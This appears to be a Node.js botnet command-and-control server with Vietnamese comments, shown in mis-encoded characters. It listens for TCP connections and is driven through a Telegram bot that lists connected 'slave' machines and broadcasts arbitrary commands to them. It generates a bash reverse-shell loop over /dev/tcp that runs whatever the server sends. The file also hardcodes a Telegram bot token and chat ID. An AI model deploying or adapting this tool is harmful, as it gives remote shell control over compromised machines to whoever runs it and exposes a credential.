const net = require('net');
const TelegramBot = require('node-telegram-bot-api');
const { execSync } = require('child_process');

// === C·∫•u h√¨nh ===
const TELEGRAM_BOT_TOKEN = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
const TELEGRAM_CHAT_ID = '7371969470';
const PORT = 7777;

// === Kh·ªüi t·∫°o bot Telegram ===
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// === Danh s√°ch c√°c bot slave ƒëang k·∫øt n·ªëi ===
let clients = [];

// === H√†m g·ª≠i k·∫øt qu·∫£ v·ªÅ Telegram ===
function sendToTelegram(message) {
  bot.sendMessage(TELEGRAM_CHAT_ID, message);
}

// === H√†m t·∫°o l·ªánh d√†nh cho slave ===
function generateSlaveCommand(ip) {
  return `while true; do
  exec 3<>/dev/tcp/${ip}/${PORT}
  while read -r cmd <&3; do
    [[ -z "$cmd" ]] && continue
    output=$(bash -c "$cmd" 2>&1)
    echo "$output" >&3
  done
  sleep 2
done`;
}

// === T·∫°o server TCP ===
const server = net.createServer((socket) => {
  const address = `${socket.remoteAddress}:${socket.remotePort}`;
  clients.push({ socket, address });

  sendToTelegram(`üü¢ Bot m·ªõi k·∫øt n·ªëi: ${address}`);

  socket.on('data', (data) => {
    const result = data.toString().trim();
    if (result) {
      sendToTelegram(`üì• K·∫øt qu·∫£ t·ª´ ${address}:\n${result}`);
    }
  });

  socket.on('close', () => {
    clients = clients.filter(c => c.socket !== socket);
    sendToTelegram(`üî¥ Bot ƒë√£ ng·∫Øt k·∫øt n·ªëi: ${address}`);
  });

  socket.on('error', () => {
    clients = clients.filter(c => c.socket !== socket);
    sendToTelegram(`üî¥ Bot l·ªói k·∫øt n·ªëi: ${address}`);
  });
});

server.listen(PORT, async () => {
  const ipv4 = execSync("curl -s https://api.ipify.org").toString().trim();
  console.log(`üî• Server s·∫µn s√†ng tr√™n c·ªïng ${PORT}`);
  sendToTelegram(`üî• Server s·∫µn s√†ng tr√™n c·ªïng ${PORT}\n\nCopy l·ªánh n√†y ch·∫°y tr√™n slave ƒë·ªÉ k·∫øt n·ªëi:\n\`\`\`\n${generateSlaveCommand(ipv4)}\n\`\`\``);
});

// === X·ª≠ l√Ω l·ªánh t·ª´ Telegram ===
bot.onText(/^\/listbot$/, () => {
  if (clients.length === 0) {
    return sendToTelegram('üìõ Kh√¥ng c√≥ bot n√†o ƒëang k·∫øt n·ªëi.');
  }
  const list = clients.map((c, i) => `Bot ${i + 1} [${c.address}]`).join('\n');
  sendToTelegram(`üìã Danh s√°ch ${clients.length} bot ƒëang k·∫øt n·ªëi:\n${list}`);
});

bot.onText(/^\/cmd (.+)/, (_, match) => {
  const cmd = match[1];
  if (clients.length === 0) {
    return sendToTelegram('üìõ Kh√¥ng c√≥ bot n√†o ƒëang k·∫øt n·ªëi ƒë·ªÉ g·ª≠i l·ªánh.');
  }
  sendToTelegram(`üì§ G·ª≠i l·ªánh: \`${cmd}\` ƒë·∫øn ${clients.length} bot...`);
  clients.forEach(c => {
    try {
      c.socket.write(cmd + '\n');
    } catch (e) {}
  });
});
